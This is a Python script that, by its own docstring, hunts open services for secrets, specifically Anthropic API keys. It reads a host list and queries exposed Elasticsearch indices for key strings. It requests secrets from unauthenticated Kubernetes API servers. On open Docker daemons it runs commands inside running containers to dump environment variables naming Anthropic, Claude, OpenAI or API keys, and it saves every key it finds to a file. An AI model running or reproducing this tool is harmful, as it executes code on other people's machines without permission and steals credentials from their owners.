#!/usr/bin/env python3
"""Hunt open services for secrets, specifically Anthropic keys."""
import json, re, sys, requests, urllib3
urllib3.disable_warnings()
RE_KEY = re.compile(r"sk-ant-[A-Za-z0-9_\-]{20,}")
def j(r):
    try: return r.json()
    except Exception: return None
def es_check(h):
    out=[]
    try:
        r=requests.get(f"http://{h}/_cat/indices?format=json",timeout=6)
        idx=j(r)
        if not isinstance(idx,list): return out
        names=[i.get("index") for i in idx][:15]
        out.append({"h":h,"svc":"elasticsearch","indices":names})
        for n in names[:5]:
            try:
                s=requests.post(f"http://{h}/{n}/_search",json={"size":3,"query_string":{"query":"sk-ant*"}},timeout=6)
                t=s.text
                if "sk-ant-" in t:
                    out.append({"h":h,"svc":"ES-KEY","index":n,"keys":RE_KEY.findall(t)[:3]})
            except Exception: pass
    except Exception: pass
    return out
def k8s_check(h):
    out=[]
    try:
        v=requests.get(f"https://{h}/version",timeout=6,verify=False)
        if v.status_code!=200: return out
        s=requests.get(f"https://{h}/api/v1/secrets",timeout=6,verify=False)
        if s.status_code==200 and '"items"' in s.text:
            out.append({"h":h,"svc":"k8s-secrets-anon","n":len((j(s) or {}).get("items",[])),
                        "keys":RE_KEY.findall(s.text)[:3]})
    except Exception: pass
    return out
def docker_check(h):
    out=[]
    try:
        v=requests.get(f"http://{h}/version",timeout=6)
        d=j(v)
        if not d or "ApiVersion" not in d: return out
        cl=requests.get(f"http://{h}/containers/json",timeout=6)
        cs=j(cl) or []
        out.append({"h":h,"svc":"docker","n":len(cs) if isinstance(cs,list) else 0})
        for c in (cs if isinstance(cs,list) else [])[:5]:
            cid=c.get("Id")
            try:
                x=requests.post(f"http://{h}/containers/{cid}/exec",
                    json={"Cmd":["sh","-c","env | grep -i -E 'anthropic|claude|openai|api_key' | head -20"],"AttachStdout":True,"AttachStderr":True},timeout=6)
                eid=(j(x) or {}).get("Id")
                if not eid: continue
                requests.post(f"http://{h}/containers/{eid}/start",json={"Detach":False,"Tty":False},timeout=8)
                lg=requests.get(f"http://{h}/containers/{eid}/logs?stdout=1&stderr=1",timeout=6)
                if "sk-ant-" in lg.text or "ANTHROPIC" in lg.text.upper():
                    out.append({"h":h,"svc":"DOCKER-ENV","container":c.get("Names"),"data":lg.text[:400],
                                "keys":RE_KEY.findall(lg.text)[:3]})
            except Exception: pass
    except Exception: pass
    return out
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    lim=int(sys.argv[2]) if len(sys.argv)>2 else 500
    results=[]; keys=[]
    for h in hosts[:lim]:
        port=h.rsplit(":",1)[-1]
        if port=="9200": r=es_check(h)
        elif port=="6443": r=k8s_check(h)
        elif port=="2375": r=docker_check(h)
        else: r=[]
        for x in r:
            results.append(x)
            if x.get("keys"): keys+=x["keys"]
            print(json.dumps(x)[:300], flush=True)
    print(f"TOTAL findings={len(results)} keys={len(set(keys))}")
    json.dump({"findings":results,"keys":sorted(set(keys))}, open("/tmp/hunt_out.json","w"), indent=1)
if __name__=="__main__": main()
